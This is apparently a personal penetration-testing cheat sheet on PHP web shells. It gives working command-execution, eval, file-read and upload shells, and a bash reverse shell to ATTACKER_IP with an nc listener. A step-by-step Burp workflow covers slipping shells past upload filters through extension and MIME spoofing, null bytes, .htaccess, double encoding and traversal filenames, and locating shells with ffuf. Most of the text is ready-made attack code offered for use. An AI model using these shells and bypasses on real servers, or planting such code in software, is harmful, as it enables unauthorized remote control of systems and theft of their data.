# Web Shells

## Different Web Shells
### Read File Contents (Traversal-style LFI)

```php 
<?php 
	echo file_get_contents($_GET['file']); 
?>
```

- **Access via**: `shell.php?file=../../../../etc/passwd`
- Can be used for **file traversal** and **LFI-style reads**

### Execute System Commands (Command Execution Shell)

```php
<?php 
	system($_GET['cmd']); 
?>
```

- **Access via**: `shell.php?cmd=id` or `cmd=whoami`
- Run arbitrary commands on the server

### Eval-Based Execution Shell (Code Execution Shell)

```php
<?php 
	eval($_GET['cmd']); 
?>
```

- **Access via**: `shell.php?cmd=echo 'whoami';`
- Highly dangerous — allows execution of **PHP code**
- Use with caution; PHP functions, `file_put_contents`, etc. can be abused

### Web Reverse Shell (Connect Back to Listener)

```php
<?php
	exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

- **Replace `ATTACKER_IP`** with your IP
- Run a listener on your machine:  

  ```bash
  nc -lvnp 4444
  ```

- Grants persistent shell

### Simple Upload Web Shell

```php
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
<?php
if ($_FILES['file']) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
```

- Lets you upload additional shells/files once initial access is gained
- Used to **escalate control** or drop more tools

### PHP+JS Hybrid (Browser Exploitable)

```php
<?php
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; 
?>
```

- View clean output in browser (renders `<pre>` tag)
- **Access via**: `shell.php?cmd=ls -la`
- Easier for visibility/debugging in labs

## Uploading Web Shells with Burp

### Step-by-step Workflow

1. **Start Burp Intercept**  
   - Enable Intercept in **Proxy > Intercept**
   - Go to the upload form in your browser
   - Select your shell (e.g., `shell.php`)

2. **Intercept the Request**
   - Burp will capture the HTTP POST request

3. **Modify the Request in Raw Tab**

Here’s an example **original HTTP request**:

```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXYZ--
```

### Modify to Bypass Filters

#### Extension Tricks

Try bypassing filters using:
- `shell.php.jpg`
- `shell.p.phphp`
- `shell.php%00.jpg` (some older PHP versions)
- `shell.php    ` (with spaces)

#### MIME Type Spoof

Change:

```http
Content-Type: application/x-php
```

To:

```http
Content-Type: image/jpeg
```

Or even:

```http
Content-Type: text/plain
```

### Hidden Upload Directory

Sometimes the shell gets uploaded to `/uploads/`, `/images/`, or `/files/`. Check these locations after upload:

```
http://target.com/uploads/shell.php
http://target.com/images/shell.php
```

### Extra

- Add random junk to `filename` to confuse naive filters:

```
filename="sh.ell.ph.p.p.php.jpg"
```

- If WAF filters content, try:
  - Uploading via `PUT` (advanced)
  - Double-encoded payloads (`%252e%252e`)
  - Uploading `.htaccess` to re-enable PHP parsing

### Test Shell (After Upload)

Access:

```
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?file=../../../../etc/passwd
```

Use Burp **Repeater** to interact further:
- Run `whoami`, `ls`, `pwd`
- Try chaining with curl/wget to pull bigger tools (like a second-stage payload)

## Finding the Web Shell

You can approach this in a few ways depending on what kind of access or visibility you have. Here's a rundown of tactics:

### Observe the Response from the Upload Page
- When you upload the shell, **look for clues in the response**.
- Sometimes the server will return the **path** or **filename** of the uploaded file.
- Check both **HTML** and **HTTP response headers**.

### Common Upload Paths

- If no path is given, try guessing based on common structures. Web apps often store uploads in predictable directories. Try these:

```
http://172.16.219.145/upload/images/shell.php
http://172.16.219.145/uploads/shell.php
http://172.16.219.145/images/shell.php
http://172.16.219.145/upload/shell.php
```
  
- Use tools like **Gobuster**, **dirb**, or **ffuf** to bruteforce directories and file paths:

```bash
ffuf -u http://172.16.219.145/FUZZ -w wordlists/common.txt -e .php,.html,.txt
```

### Try Path Traversal in Upload Name

If the upload script is vulnerable to **path traversal**, try submitting the filename like:

```
../../shell.php
../../../var/www/html/shell.php
```

- If successful, the shell could land outside of the `upload/images/` directory.
- You may need to test multiple directory levels (e.g., `../../../../../shell.php`).

### Check for Directory Listing

- See if you can browse the whole folder:

```
http://172.16.219.145/upload/images/
```

- If directory listing is enabled, your shell might just be there.

### Use a Unique Marker or Reverse Shell

- Upload a web shell that calls home (reverse shell) or contains a **unique marker** string.
- Then, use tools like `curl` or a browser to recursively search for the file using that marker.
- Or monitor **incoming connections** to your machine if it calls back (e.g., `nc -lvnp 4444`).

### If You Control the Upload Process

If you're able to intercept requests (e.g., using Burp), you can:
- Modify the **Content-Disposition** header to control the file name.
- Add traversal sequences if allowed:

```http
Content-Disposition: form-data; name="file"; filename="../../shell.php"
```


---

Last Update 20250413